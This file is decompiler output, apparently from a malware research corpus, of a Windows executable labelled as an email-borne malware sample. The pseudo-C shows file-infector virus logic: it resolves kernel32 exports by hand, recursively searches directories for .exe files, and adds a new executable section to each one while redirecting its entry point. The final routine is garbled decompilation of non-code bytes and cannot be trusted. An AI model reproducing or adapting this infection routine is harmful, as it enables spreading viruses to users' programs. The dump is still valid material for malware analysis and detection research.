/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_0825/ia32_pe/subject.exe'
 */

/* DEST BLOCK NOT FOUND: 0041204d -> 00412118 */
/* DEST BLOCK NOT FOUND: 004120c2 -> 00412118 */
/*	Procedure: 0x00412000 - 0x004120C3
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

__entry_point__(A4)
/* unknown */ void  A4;
{



    (save)eax;
    (save)eax;
    (save)ebx;
    (save)ecx;
    (save)edx;
    (save)esi;
    (save)edi;
    asm("cld");
    L0041200d();
    (restore)edi;
    edi = edi - 13;
    *(edi + 1484) = *(edi + 1488);
    for(esi = A4 & -4096; *esi != 23117; esi = esi - 4096) {
    }
    *(edi + 1476) = esi;
    if(*( *(esi + 60) + *(edi + 1476)) != 17744) {
        goto L00412118;
    }
    *(edi + 1480) = *(esi + 120) + *(edi + 1476);
    esi = edi + 1492;
L00412068:
    esi = esi + 4;
    *(esi - 4) = L004120C4();
L00412073:
    esi = esi + 1;
    if(*esi != 0) {
        goto L00412073;
    }
    esi = esi + 1;
    if(*(esi + 4) != 0) {
        goto L00412068;
    }
    (save)65536;
    (save)64;
    *(edi + 1791) = *(edi + 1601)();
    (save) *(edi + 1791);
    *(edi + 1787) = *(edi + 1617)();
    *(edi + 1759) = *(edi + 1759) + *(edi + 1647)();
    L00412560();
    (save) *(edi + 1791);
    *(edi + 1632)();
    goto L00412118;
}

stack space not deallocated on return
/*	Procedure: 0x004120C4 - 0x0041212A
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L004120C4(A18)
/* unknown */ void  A18;
{



    ebx = *( *(edi + 1480) + 12) + *(edi + 1476);
    edx = 0;
L004120d7:
    (save)esi;
    do {
        al = *esi;
        ah = *ebx;
        esi = esi + 1;
        ebx = ebx + 1;
        if(ax == 0) {
            goto L004120f2;
        }
    } while(al == ah);
    (restore)esi;
    for(edx = edx + 1; 1; ebx = ebx + 1) {
        if(ah == 0) {
            goto L004120d7;
        }
        ah = *ebx;
    }
L004120f2:
    (restore)esi;
    edx = edx - 1;
    eax = *(edi + 1476);
    edx = *( *( *(edi + 1480) + 36) + eax + edx * 2) & 65535;
    return(eax + *( *( *(edi + 1480) + 28) + eax + edx * 4));
    A18 = *(edi + 1484) + edi;
    (restore)edi;
    (restore)esi;
    (restore)edx;
    (restore)ecx;
    (restore)ebx;
    (restore)eax;
}

/*	Procedure: 0x0041212B - 0x0041212B
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0041212B()
{



    asm("int3");
}

stack space not deallocated on return
/*	Procedure: 0x0041212C - 0x004123C8
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0041212C()
{



    (save)esi;
    eax = *(edi + 1713)();
    (save)eax;
    (save)esi;
    (save)eax & -2;
    (save)esi;
    *(edi + 1736)();
    (save)2;
    (save)esi;
    eax = *(edi + 1492)();
    if(eax != -1) {
        *(edi + 1771) = eax;
        (save)0;
        (save)0;
        (save) *(edi + 1771);
        *(edi + 1538)();
        (save)64;
        esi = *(edi + 1787);
        (save)esi;
        (save) *(edi + 1771);
        if(*(edi + 1503)() == 64 && *esi == 23117) {
            *(edi + 1783) = *(esi + 60);
            (save)2;
            (save)0;
            (save) *(edi + 1771);
            *(edi + 1775) = *(edi + 1538)();
            (save)0;
            (save) *(edi + 1783);
            (save) *(edi + 1771);
            *(edi + 1538)();
            (save)224;
            (save)esi;
            (save) *(edi + 1771);
            if(*(edi + 1503)() == 224 && *esi == 17744) {
                (save)0;
                (save) *(edi + 1783);
                (save) *(edi + 1771);
                *(edi + 1538)();
                (save)( *(esi + 84) & 65535) - *(edi + 1783);
                (save)esi;
                (save) *(edi + 1771);
                eax = *(edi + 1503)();
                if(eax == ( *(esi + 84) & 65535) - *(edi + 1783) && ( *(esi + 6) & 65535) != 0) {
                    ebx = esi + 248;
                    edx = 0;
                    if(*ebx != 5394264) {
                        eax = *(ebx + 8);
                        if(eax == 0) {
                            eax = *(ebx + 16);
                        }
                        eax = eax + *(ebx + 12);
                        if(eax > edx) {
                            edx = eax;
                        }
                        ebx = ebx + 40;
                        asm("loop 0x41223e");
                        eax = edx;
                        edx = 0;
                        *(esi + 56) = *(esi + 56) / *(esi + 56);
                        if(*(esi + 56) % *(esi + 56) != 0) {
                            eax = eax + 1;
                        }
                        asm("mul dword [esi+0x38]");
                        *(edi + 1779) = eax;
                        *(edi + 1488) = *(esi + 40) - *(edi + 1779);
                        *(esi + 40) = eax;
                        eax = *(edi + 1779) + 2048;
                        edx = 0;
                        *(esi + 56) = *(esi + 56) / *(esi + 56);
                        if(*(esi + 56) % *(esi + 56) != 0) {
                            eax = eax + 1;
                        }
                        asm("mul dword [esi+0x38]");
                        *(esi + 80) = *(esi + 80) < eax ? eax : *(esi + 80) + 2048;
                        *(esi + 6) = *(esi + 6) + 1;
                        ebx = (( *(esi + 6) & 65535) << 3) + (( *(esi + 6) & 65535) << 3) * 4 + 248;
                        eax = ebx + 40;
                        if(( *(esi + 84) & 65535) - *(edi + 1783) >= eax) {
                            ebx = esi + ebx;
                            eax = *(edi + 1775);
                            edx = 0;
                            *(esi + 60) = *(esi + 60) / *(esi + 60);
                            if(*(esi + 60) % *(esi + 60) != 0) {
                                eax = eax + 1;
                            }
                            asm("mul dword [esi+0x3c]");
                            *(edi + 1775) = eax;
                            if(*(esi + 208) != 0) {
                                (save)esi;
                                (save)edi;
                                edi = *(esi + 84) + esi;
                                ecx = edi - ebx;
                                esi = edi - 40;
                                asm("std");
                                asm("rep movsb");
                                asm("cld");
                                (restore)edi;
                                (restore)esi;
                                *(esi + 208) = *(esi + 208) + 40;
                            }
                            *ebx = 5394264;
                            *(ebx + 4) = 0;
                            *(ebx + 8) = 2048;
                            *(ebx + 12) = *(edi + 1779);
                            *(ebx + 16) = 2048;
                            *(ebx + 20) = *(edi + 1775);
                            *(ebx + 24) = 0;
                            *(ebx + 28) = 0;
                            *(ebx + 32) = 0;
                            *(ebx + 36) = -1073741728;
                            (save)0;
                            (save) *(edi + 1783);
                            (save) *(edi + 1771);
                            *(edi + 1538)();
                            (save)( *(esi + 84) & 65535) - *(edi + 1783);
                            (save)esi;
                            (save) *(edi + 1771);
                            *(edi + 1514)();
                            (save)0;
                            (save) *(edi + 1775);
                            (save) *(edi + 1771);
                            *(edi + 1538)();
                            (save)2048;
                            (save)edi;
                            (save) *(edi + 1771);
                            *(edi + 1514)();
                        }
                    }
                }
            }
        }
        (save) *(edi + 1771);
        *(edi + 1526)();
    }
    return(*(edi + 1736)());
}

stack space not deallocated on return
/*	Procedure: 0x004123C9 - 0x0041253D
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004123C9()
{



    (save)ebp;
    ebp = esp;
    esp = esp - 12;
    (save)ebx;
    (save)esi;
    (save)12288;
    (save)64;
    *(ebp - 4) = *(edi + 1601)();
    (save) *(ebp - 4);
    *(ebp - 8) = *(edi + 1617)();
    (restore)esi;
    (restore)ebx;
    for(edx = *(ebp - 8); 1; edx = edx + 1) {
        al = *esi;
        esi = esi + 1;
        if(al == 0) {
            break;
        }
        *edx = al;
    }
    if(ebx != 0) {
        while(1) {
            al = *ebx;
            ebx = ebx + 1;
            if(al == 0) {
                break;
            }
            *edx = al;
            edx = edx + 1;
        }
    }
    *edx = 92;
    edx = *(ebp - 8) + 4096;
    esi = *(ebp - 8);
    for(ebx = edi + 1767; 1; edx = edx + 1) {
        al = *esi;
        esi = esi + 1;
        if(al == 0) {
            break;
        }
        *edx = al;
    }
    do {
        al = *ebx;
        ebx = ebx + 1;
        *edx = al;
        edx = edx + 1;
    } while(al != 0);
    (save) *(ebp - 8) + 8192;
    (save) *(ebp - 8) + 4096;
    eax = *(edi + 1550)();
    for(*(ebp - 12) = eax; eax != 0; eax = *(edi + 1569)()) {
        eax = 5;
        if(L0041253E() == 0) {
            esi = *(ebp - 8) + 8192;
            if(( *esi & 16) != 16) {
                for(esi = *(ebp - 8) + 8236; 1; esi = esi + 1) {
                    if(*esi == 46) {
                        if(*(esi + 1) == 101) {
                            goto L004124ba;
                        }
                        if(*(esi + 1) == 69) {
L004124ba:
                            if(*(esi + 2) == 120) {
                                goto L004124c6;
                            }
                            if(*(esi + 2) == 88) {
L004124c6:
                                if(*(esi + 3) == 101) {
                                    goto L004124d2;
                                }
                                if(*(esi + 3) == 69) {
L004124d2:
                                    if(*(esi + 4) == 0) {
                                        break;
                                    }
                                }
                            }
                        }
                    }
                    if(*esi == 0) {
                        goto L00412510;
                    }
                }
                edx = *(edi + 1787);
                esi = *(ebp - 8);
                for(ebx = esi + 8236; 1; edx = edx + 1) {
                    al = *esi;
                    esi = esi + 1;
                    if(al == 0) {
                        break;
                    }
                    *edx = al;
                }
                do {
                    al = *ebx;
                    ebx = ebx + 1;
                    *edx = al;
                    edx = edx + 1;
                } while(al != 0);
                esi = *(edi + 1787);
                L0041212C();
            } else {
                if(*(esi + 44) != 46) {
                    esi = *(ebp - 8);
                    L004123C9();
                }
            }
        }
L00412510:
        (save) *(ebp - 8) + 8192;
        (save) *(ebp - 12);
    }
    (save) *(ebp - 12);
    *(edi + 1587)();
    (save) *(ebp - 4);
    eax = *(edi + 1632)();
    esp = esp + 12;
    (restore)ebp;
}

/*	Procedure: 0x0041253E - 0x0041255F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L0041253E()
{
	/* unknown */ void  edx;



    (save)eax;
    1103515245 = *(edi + 1759) * eax;
    *(edi + 1759) = eax + 12345;
    (restore)eax;
    asm("mul dword [edi+0x6df]");
    return(edx);
}

/* DEST BLOCK NOT FOUND: 004125d6 -> 6fad8552 */
/*	Procedure: 0x00412560 - 0x00412610
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00412560()
{



    (save)4096;
    (save) *(edi + 1787);
    *(edi + 1664)();
    esi = *(edi + 1787);
    ebx = 0;
    eax = L004123C9();
    (save)4096;
    (save) *(edi + 1787);
L00412586:
    *(edi + 1689)();
    esi = *(edi + 1787);
    ebx = 0;
    L004123C9();
    esi = edi + 1766;
    ebx = 0;
    L004123C9();
    esi = edi + 1765;
    ebx = 0;
    L004123C9();
    esi = edi + 1764;
    ebx = 0;
    L004123C9();
    return;
    eax = Leda56642();
    if(*eax = *eax + al) {
        goto L00412586;
    }
    asm("Unknown opcode 0xf3");
    asm("Unknown opcode 0xfe");
    asm("xlatb");
    goto L6fad8552;
    if(*(ecx + 738197233) = *(ecx + 738197233) - 1) {
        goto L0a0680c0;
    }
    asm("outsb");
    asm("insb");
    if(*(edi + 1601694107) = *(edi + 1601694107) + dl) {
        goto L0a07ea30;
    }
    asm("popa");
    if(*%fs:eax+ebp*8-0x18] = *%fs:eax+ebp*8-0x18] + bl) {
        goto L0a07ea48;
    }
    asm("insb");
    > ? "GlobalFree" : ;
    2011746895 = *ebp * esi;
    (restore)edi;
    asm("insb");
    asm("arpl [edi+ebp*2+0x73],bp");
    asm("rep jmp 0x6cad8580");
    if(*%gs:eax] = *%gs:eax] + bh) {
        goto L00412670;
    }
    -44 = *%gs:eax] * eax;
    asm("Unknown opcode 0x8d");
    L8e1526fd();
}

/* address  size  */
/* 0x00402000       0 */ /* unknown */ void 	__imp__CloseHandle;
/* 0x00402004       0 */ /* unknown */ void 	__imp__WriteFile;
/* 0x00402008       0 */ /* unknown */ void 	__imp__CreateFileA;
/* 0x0040200c       0 */ /* unknown */ void 	__imp__SizeofResource;
/* 0x00402010       0 */ /* unknown */ void 	__imp__LockResource;
/* 0x00402014       0 */ /* unknown */ void 	__imp__LoadResource;
/* 0x00402018       0 */ /* unknown */ void 	__imp__FindResourceA;
/* 0x0040201c       0 */ /* unknown */ void 	__imp__GetModuleHandleA;
/* 0x00402020       0 */ /* unknown */ void 	__imp__CopyFileA;
/* 0x00402024       0 */ /* unknown */ void 	__imp__lstrcatA;
/* 0x00402028       0 */ /* unknown */ void 	__imp__GetWindowsDirectoryA;
/* 0x0040202c       0 */ /* unknown */ void 	__imp__GetModuleFileNameA;
/* 0x00402030       0 */ /* unknown */ void 	__imp__GetProcAddress;
/* 0x00402034       0 */ /* unknown */ void 	__imp__LoadLibraryA;
/* 0x00402038       0 */ /* unknown */ void 	__imp__GetTickCount;
/* 0x0040203c       0 */ /* unknown */ void 	__imp__GetLastError;
/* 0x00402040       0 */ /* unknown */ void 	__imp__CreateMutexA;
/* 0x00412000       0 */ /* unknown */ void 	__entry_point__;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
